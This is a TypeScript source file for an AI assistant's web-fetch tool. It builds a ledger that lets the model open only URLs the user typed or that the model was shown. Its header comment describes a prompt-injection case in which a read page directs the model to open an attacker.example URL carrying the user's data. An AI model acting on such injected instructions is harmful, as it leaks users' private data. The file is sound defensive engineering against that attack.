/**
 * The provenance ledger: `web_fetch` opens a URL only if it appeared verbatim —
 * up to benign normalisation — in something the user typed in this
 * conversation or something the model was shown this turn (SPEC §6.2). URLs the
 * model wrote itself never count.
 *
 * Why a ledger at all. A model that can fetch any URL it likes is an
 * exfiltration channel: a page it read can tell it to open
 * `https://attacker.example/?d=<the user's data>`, and a GET is enough to send
 * the data. Refusing every URL that nobody showed it closes that road without
 * refusing a single link a person would have clicked (`url-canon.ts` holds the
 * matching rule: drop, never add).
 *
 * Two classes. User-class entries (what the user typed or has in memory) are
 * always kept and always win a match; untrusted entries (search results,
 * fetched pages, connector output, attachments) are capped, oldest out first,
 * and stop counting for the rest of a turn once a scan has called that turn's
 * content hostile (`fetch-page.ts`, §6.1 step 3).
 *
 * The ledger is built lazily, on the first `web_fetch` of a turn, so a web-on
 * turn that never fetches decrypts no older rows (§6.2.3). Free of
 * `server-only`: the two bounded history queries arrive through a port, and
 * the default port is imported only when a build actually needs it.
 */

import { canonicalize, canonKey, extractUrlCandidates, matches, type Canon } from "@/lib/web/url-canon";
import type { LazyUrlLedger, UrlLedgerKind, UrlLedgerMatch } from "@/lib/web/types";

/** Kinds that come from the user rather than from outside content. */
export const USER_CLASS_KINDS: ReadonlySet<UrlLedgerKind> = new Set<UrlLedgerKind>(["user_message", "user_memory"]);

/** Untrusted entries kept per turn; user-class entries are never evicted. */
export const DEFAULT_LEDGER_CAP = 5_000;
/** Rows each history query reads at most (§6.2.1). */
export const LEDGER_HISTORY_ROWS = 200;

interface Entry {
  canon: Canon;
  kind: UrlLedgerKind;
  ref?: string;
  userClass: boolean;
  key: string;
}

function hostKey(canon: Canon): string {
  return `${canon.host}|${canon.port}`;
}

/** Identity of an entry for de-duplication: same class, same canonical URL. */
function entryKey(canon: Canon, userClass: boolean): string {
  return `${userClass ? "u" : "x"}|${canonKey(canon)}`;
}

export class UrlLedger implements LazyUrlLedger {
  private readonly byHost = new Map<string, Entry[]>();
  private readonly keys = new Set<string>();
  /** Untrusted entries in insertion order, for eviction. `head` skips the evicted prefix. */
  private readonly untrusted: Entry[] = [];
  private head = 0;
  private readonly cap: number;

  /** `cap`: untrusted entries kept (default 5,000); user-class entries are always kept. */
  constructor(cap?: number) {
    this.cap = Math.max(1, cap ?? DEFAULT_LEDGER_CAP);
  }

  /** Adds every URL (and, for user text, every bare domain) found in `text`. */
  addText(text: string, kind: UrlLedgerKind, ref?: string): void {
    const bareDomain = kind === "user_message";
    for (const candidate of extractUrlCandidates(text, { bareDomain })) this.add(candidate, kind, ref, { bareDomain });
  }

  add(raw: string, kind: UrlLedgerKind, ref?: string, opts?: { bareDomain: boolean }): void {
    // Bare domains only ever come from what the user typed (§6.2.2).
    const canon = canonicalize(raw, { bareDomain: kind === "user_message" && (opts?.bareDomain ?? true) });
    if (!canon) return;
    const userClass = USER_CLASS_KINDS.has(kind);
    const key = entryKey(canon, userClass);
    if (this.keys.has(key)) return;
    const entry: Entry = { canon, kind, userClass, key, ...(ref ? { ref } : {}) };
    this.keys.add(key);
    const bucket = this.byHost.get(hostKey(canon));
    if (bucket) bucket.push(entry);
    else this.byHost.set(hostKey(canon), [entry]);
    if (!userClass) {
      this.untrusted.push(entry);
      if (this.untrusted.length - this.head > this.cap) this.evictOldest();
    }
  }

  /** The matching entry, if any; user class wins over untrusted. */
  match(raw: string): UrlLedgerMatch | null {
    const candidate = canonicalize(raw, { bareDomain: true });
    if (!candidate) return null;
    const bucket = this.byHost.get(hostKey(candidate));
    if (!bucket) return null;
    let found: Entry | null = null;
    for (const entry of bucket) {
      if (!matches(candidate, entry.canon)) continue;
      if (entry.userClass) return { kind: entry.kind, userClass: true };
      found ??= entry;
    }
    return found ? { kind: found.kind, userClass: false } : null;
  }

  /** Entries held, by class (for tests and the cap). */
  get size(): { user: number; untrusted: number } {
    const untrusted = this.untrusted.length - this.head;
    return { user: this.keys.size - untrusted, untrusted };
  }

  private evictOldest(): void {
    const oldest = this.untrusted[this.head];
    this.head += 1;
    if (!oldest) return;
    this.keys.delete(oldest.key);
    const bucketKey = hostKey(oldest.canon);
    const bucket = this.byHost.get(bucketKey);
    if (bucket) {
      const at = bucket.indexOf(oldest);
      if (at >= 0) bucket.splice(at, 1);
      if (bucket.length === 0) this.byHost.delete(bucketKey);
    }
    // Compact now and then so the array does not grow without bound over a long turn.
    if (this.head > 1_024 && this.head * 2 > this.untrusted.length) {
      this.untrusted.splice(0, this.head);
      this.head = 0;
    }
  }
}

/** One source of an earlier assistant row, as `Message.sources` persisted it. */
export interface LedgerHistorySource {
  url: string;
  /** `ChatSourceOrigin` when the row was written after the rework; absent on legacy rows. */
  origin?: string | null;
}

export interface LedgerHistoryRow {
  /** The row's model id (`provider:model`), which is how a legacy Gemini row is recognised. */
  model: string | null;
  sources: readonly LedgerHistorySource[];
}

/**
 * The two bounded history queries (§6.2.1). Injected so this file stays
 * testable offline; `ledger-db.ts` is the real one. Never called for a private
 * chat (INV-32).
 */
export interface LedgerHistoryPort {
  /** Up to `limit` USER rows of the conversation, newest first, decrypted. */
  userTexts(conversationId: string, limit: number): Promise<string[]>;
  /** `Message.sources` of up to `limit` assistant rows of the conversation, newest first. */
  assistantSources(conversationId: string, limit: number): Promise<LedgerHistoryRow[]>;
}

/** What the route already holds at turn start, plus the two bounded queries (SPEC §6.2.1). */
export interface LedgerTurnInput {
  userId: string;
  conversationId: string | null;
  private: boolean;
  /** USER messages of the window and the current message, decrypted. */
  userTexts: readonly string[];
  /** Memory entries in this turn's prompt. */
  memoryTexts: readonly string[];
  /** Attachment text, project reference files, retrieved passages, an untrusted skill block. */
  attachmentTexts: readonly string[];
  /** Earlier assistant rows' typed tool records in the window (for `tool_note`). */
  toolNoteUrls: readonly string[];
  /** Sources of a completed research report injected this turn. */
  researchSourceUrls: readonly string[];
  /** The history queries; the database-backed port when absent. Ignored for a private chat. */
  history?: LedgerHistoryPort;
  /** Untrusted entries kept; `DEFAULT_LEDGER_CAP` when absent. */
  cap?: number;
}

/**
 * Whether an earlier assistant row's source may join the ledger as a search
 * result. Gemini grounding URLs are Google redirect links minted for that one
 * answer (§5.3 item 7), so they never count; a legacy row has no `origin`, so
 * every source of a legacy Gemini row is skipped rather than guessed at.
 */
export function historySourceCounts(row: LedgerHistoryRow, source: LedgerHistorySource): boolean {
  if (source.origin === "provider_grounding") return false;
  if (!source.origin && row.model?.startsWith("google:")) return false;
  return true;
}

async function defaultHistoryPort(userId: string): Promise<LedgerHistoryPort> {
  const { ledgerHistoryForUser } = await import("@/lib/web/ledger-db");
  return ledgerHistoryForUser(userId);
}

export async function buildUrlLedger(turn: LedgerTurnInput): Promise<UrlLedger> {
  const ledger = new UrlLedger(turn.cap);
  for (const text of turn.userTexts) ledger.addText(text, "user_message");
  for (const text of turn.memoryTexts) ledger.addText(text, "user_memory");

  // A private chat builds from what the route holds and nothing else: no
  // database read of any kind (INV-32).
  if (!turn.private && turn.conversationId) {
    try {
      const history = turn.history ?? (await defaultHistoryPort(turn.userId));
      const [older, assistantRows] = await Promise.all([
        history.userTexts(turn.conversationId, LEDGER_HISTORY_ROWS),
        history.assistantSources(turn.conversationId, LEDGER_HISTORY_ROWS),
      ]);
      for (const text of older.slice(0, LEDGER_HISTORY_ROWS)) ledger.addText(text, "user_message");
      for (const row of assistantRows.slice(0, LEDGER_HISTORY_ROWS)) {
        for (const source of row.sources) {
          if (historySourceCounts(row, source)) ledger.add(source.url, "search_result");
        }
      }
    } catch (error) {
      // A failed history read narrows what can be opened; it never widens it,
      // and it must not take the tool call down with it.
      console.warn("[web/provenance] history read failed:", error instanceof Error ? error.message : error);
    }
  }

  for (const url of turn.researchSourceUrls) ledger.add(url, "research_source");
  for (const url of turn.toolNoteUrls) ledger.add(url, "tool_note");
  for (const text of turn.attachmentTexts) ledger.addText(text, "attachment");
  return ledger;
}

type Pending =
  | { op: "addText"; text: string; kind: UrlLedgerKind; ref?: string }
  | { op: "add"; raw: string; kind: UrlLedgerKind; ref?: string; opts?: { bareDomain: boolean } };

/**
 * The turn's ledger handle (§6.2.3). Additions made before the first match
 * are buffered and applied once the build finishes; `match` awaits the build
 * exactly once, however many fetches race to it. A build that throws leaves an
 * empty ledger plus the buffered in-turn additions: fewer links can be opened,
 * never more.
 */
export class LazyLedger implements LazyUrlLedger {
  private ledger: UrlLedger | null = null;
  private building: Promise<UrlLedger> | null = null;
  private readonly pending: Pending[] = [];

  constructor(private readonly build: () => Promise<UrlLedger>) {}

  /** True once the build has run (for tests: a turn that never fetches never builds). */
  get built(): boolean {
    return this.ledger !== null;
  }

  addText(text: string, kind: UrlLedgerKind, ref?: string): void {
    if (this.ledger) this.ledger.addText(text, kind, ref);
    else this.pending.push({ op: "addText", text, kind, ...(ref ? { ref } : {}) });
  }

  add(raw: string, kind: UrlLedgerKind, ref?: string, opts?: { bareDomain: boolean }): void {
    if (this.ledger) this.ledger.add(raw, kind, ref, opts);
    else this.pending.push({ op: "add", raw, kind, ...(ref ? { ref } : {}), ...(opts ? { opts } : {}) });
  }

  async match(raw: string): Promise<UrlLedgerMatch | null> {
    return (await this.ready()).match(raw);
  }

  private ready(): Promise<UrlLedger> {
    if (this.ledger) return Promise.resolve(this.ledger);
    this.building ??= this.build()
      .catch((error: unknown) => {
        console.warn("[web/provenance] ledger build failed:", error instanceof Error ? error.message : error);
        return new UrlLedger();
      })
      .then((ledger) => {
        for (const item of this.pending.splice(0)) {
          if (item.op === "addText") ledger.addText(item.text, item.kind, item.ref);
          else ledger.add(item.raw, item.kind, item.ref, item.opts);
        }
        this.ledger = ledger;
        return ledger;
      });
    return this.building;
  }
}

/** The handle a turn passes to its web tools: built from `input` on the first `web_fetch`. */
export function createLazyUrlLedger(input: LedgerTurnInput | (() => Promise<UrlLedger>)): LazyLedger {
  return new LazyLedger(typeof input === "function" ? input : () => buildUrlLedger(input));
}
